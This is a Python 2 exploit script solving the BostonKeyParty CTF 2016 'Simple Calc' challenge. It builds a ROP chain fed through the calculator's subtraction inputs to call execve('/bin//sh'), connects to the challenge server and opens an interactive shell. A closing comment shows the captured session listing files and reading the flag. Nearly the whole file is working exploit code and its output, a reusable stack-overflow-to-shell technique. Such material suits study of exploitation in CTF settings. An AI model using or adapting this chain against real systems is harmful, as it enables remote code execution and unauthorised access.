#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# BostonKeyParty CTF 2016 - Simple Calc (Pwn 5pt)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def push_addr( addr ):
    # Write a 4 byte address to the stack (set 4 MSB to 0)
    # Do a subtraction: 2*addr - addr = addr
    return  '2' + '\n' + str(2*addr) + '\n' + str(addr) + '\n' +\
            '2' + '\n' + '1337'      + '\n' + '1337'    + '\n'

# --------------------------------------------------------------------------------------------------
def push_value( addr ):                         # write a 4 byte address to the stack   
    return  '2' + '\n' + str(2*addr) + '\n' + str(addr) + '\n'
    
# --------------------------------------------------------------------------------------------------
def recv_until(st):                             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)
  return ret
 
# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":

    s = socket.create_connection(('simplecalc.bostonkey.party', 5400))
#   s = socket.create_connection(('localhost', 7777))

    recv_until('Expected number of calculations: ')

    p  = '255' + '\n'                           # allocate a big buffer
    
    # Fill with zeros first
    p += ('2' + '\n' + '1000' + '\n' + '1000' + '\n')*18

    # ROP exploit
    p += push_addr(0x0000000000401c87)          # pop rsi ; ret
    p += push_addr(0x00000000006c1060)          # @ .data
    p += push_addr(0x000000000044db34)          # pop rax ; ret

    p += push_value(0x6e69622f)                 # '/bin'
    p += push_value(0x68732f2f)                 # '//sh'
    
    p += push_addr(0x0000000000470f11)          # mov qword ptr [rsi], rax ; ret
    p += push_addr(0x0000000000401c87)          # pop rsi ; ret
    p += push_addr(0x00000000006c1068)          # @ .data + 8
    p += push_addr(0x000000000041c61f)          # xor rax, rax ; ret
    p += push_addr(0x0000000000470f11)          # mov qword ptr [rsi], rax ; ret
    p += push_addr(0x0000000000401b73)          # pop rdi ; ret
    p += push_addr(0x00000000006c1060)          # @ .data
    p += push_addr(0x0000000000401c87)          # pop rsi ; ret
    p += push_addr(0x00000000006c1068)          # @ .data + 8
    p += push_addr(0x0000000000437a85)          # pop rdx ; ret
    p += push_addr(0x00000000006c1068)          # @ .data + 8
    p += push_addr(0x000000000041c61f)          # xor rax, rax ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000400488)          # syscall

    p += '5' + '\n'                             # exit
    s.send( p )                                 # send payload

    print ' *** Opening Shell *** '
    t = telnetlib.Telnet()                      # try to open shell
    t.sock = s
    t.interact()
    
    exit(0)
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/bostonkeyparty# ./simple_calc_expl.py 
    [..... TRUNCATED FOR BREVITY .....]
    Options Menu: 
     [1] Addition.
     [2] Subtraction.
     [3] Multiplication.
     [4] Division.
     [5] Save and Exit
    .=> ls -la
        total 1188
        drwxr-xr-x 2 calc calc   4096 Mar  4 05:23 .
        drwxr-xr-x 3 root root   4096 Mar  4 05:04 ..
        -rw-r--r-- 1 calc calc    220 Mar  4 05:04 .bash_logout
        -rw-r--r-- 1 calc calc   3637 Mar  4 05:04 .bashrc
        -rw-r--r-- 1 calc calc    675 Mar  4 05:04 .profile
        -rw-r--r-- 1 root root     32 Mar  4 05:23 key
        -rwxr-xr-x 1 root root     80 Mar  4 05:14 run.sh
        -rwxrwxr-x 1 calc calc 882266 Mar  4 05:04 simpleCalc
        -rw-r--r-- 1 root root 302348 Feb  1  2014 socat_1.7.2.3-1_amd64.deb
    whoami
        nobody
    cat key
        BKPCTF{what_is_2015_minus_7547}
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
